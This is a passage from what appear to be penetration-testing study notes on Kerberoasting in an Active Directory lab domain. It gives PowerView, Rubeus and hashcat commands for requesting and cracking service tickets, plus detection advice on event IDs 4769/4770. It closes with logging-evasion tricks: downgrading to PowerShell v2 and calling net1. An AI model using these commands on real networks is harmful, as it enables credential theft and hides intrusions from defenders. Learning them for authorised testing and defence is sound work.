Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes


#serviceprincipalname       msds-supportedencryptiontypes samaccountname
# ----------                 ----------------------------- --------------
# testspn/kerberoast.inlanefreight.local               24   testspn
```

With AES (type 18) encryption, this would be the hashcat module:

```shell-session
hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt 
```

**We can use Rubeus with the `/tgtdeleg` flag to specify that we want only RC4 encryption  when requesting a new service ticket even though the supported encryption types are listed as AES 128/256.** This may be a failsafe built-in to Active Directory for backward compatibility.

```powershell
# Perform Kerberoasting on a user testspn
.\Rubeus.exe kerberoast /user:testspn /nowrap /tgtdeleg
# /tgtdeleg: specify that we want only RC4 encryption when requesting a new service ticket.
```

> Note: This does not work against a Windows Server 2019 Domain Controller, regardless of the domain functional level. It will always return a service ticket encrypted with the highest level of encryption supported by the target account. This being said, if we find ourselves in a domain with Domain Controllers running on Server 2016 or earlier (which is quite common), enabling AES will not partially mitigate Kerberoasting by only returning AES encrypted tickets, which are much more difficult to crack, but rather will allow an attacker to request an RC4 encrypted service ticket. In Windows Server 2019 DCs, enabling AES encryption on an SPN account will result in us receiving an AES-256 (type 18) service ticket, which is substantially more difficult (but not impossible) to crack, especially if a relatively weak dictionary password is in use.

> In addition, It is possible to edit the encryption types used by Kerberos. This can be done by opening Group Policy, editing the Default Domain Policy, and choosing: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options, then double-clicking on Network security: Configure encryption types allowed for Kerberos and selecting the desired encryption type allowed for Kerberos. Removing all other encryption types except for RC4_HMAC_MD5 would allow for the above downgrade example to occur in 2019. Removing support for AES would introduce a security flaw into AD and should likely never be done. 


##### Mitigating Kerberoasting

Kerberoasting requests Kerberos TGS tickets with RC4 encryption, which should not be the majority of Kerberos activity within a domain. When Kerberoasting is occurring in the environment, we will see an abnormal number of TGS-REQ and TGS-REP requests and responses, signaling the use of automated Kerberoasting tools.

omain controllers can be configured to log Kerberos TGS ticket requests by selecting [Audit Kerberos Service Ticket Operations](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-kerberos-service-ticket-operations) within Group Policy. Doing so will generate two separate event IDs:

-  [4769](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4769): A Kerberos service ticket was requested, 
- and [4770](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4770): A Kerberos service ticket was renewed.

10-20 Kerberos TGS requests for a given account can be considered normal in a given environment. A large amount of 4769 event IDs from one account within a short period may indicate an attack.

Some other remediation steps include restricting the use of the RC4 algorithm, particularly for Kerberos requests by service accounts. This must be tested to make sure nothing breaks within the environment. Furthermore, Domain Admins and other highly privileged accounts should not be used as SPN accounts (if SPN accounts must exist in the environment).


### Evasion Techniques

#### Downgrade Powershell

Many defenders are unaware that several versions of PowerShell often exist on a host. If not uninstalled, they can still be used. Powershell event logging was introduced as a feature with Powershell 3.0 and forward. With that in mind, we can attempt to call Powershell version 2.0 or older. If successful, our actions from the shell will not be logged in Event Viewer. 

With [Script Block Logging](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.2) enabled, we can see that whatever we type into the terminal gets sent to this log. If we downgrade to PowerShell V2, this will no longer function correctly. Our actions after will be masked since Script Block Logging does not work below PowerShell 3.0.

```powershell
powershell.exe -version 2
```

PowerShell Operational Logs are kept under under `Applications and Services Logs > Microsoft > Windows > PowerShell > Operational`.
Also the `Windows PowerShell` log is located at `Applications and Services Logs > Windows PowerShell`.

#### Net Commands Trick

Typing `net1` instead of `net` will execute the same functions without the potential trigger from the net string. Example:

```powershell
net1 user /domain	
```
